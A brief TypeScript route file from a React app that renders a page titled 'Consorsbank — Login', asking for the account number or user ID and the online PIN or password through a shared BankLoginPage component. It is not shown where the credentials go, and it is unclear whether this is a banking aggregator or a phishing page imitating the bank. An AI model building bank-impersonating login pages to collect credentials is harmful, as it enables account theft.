import { createFileRoute } from "@tanstack/react-router";
import { BankLoginPage } from "@/components/BankLoginPage";

export const Route = createFileRoute("/bank/consorsbank")({
  head: () => ({ meta: [{ title: "Consorsbank — Login" }] }),
  component: () => (
    <BankLoginPage idPrefix="consors" logoSlug="consorsbank" title="Consorsbank" field1Label="Kontonummer / UserID" field2Label="Online-PIN / Passwort" />
  ),
});
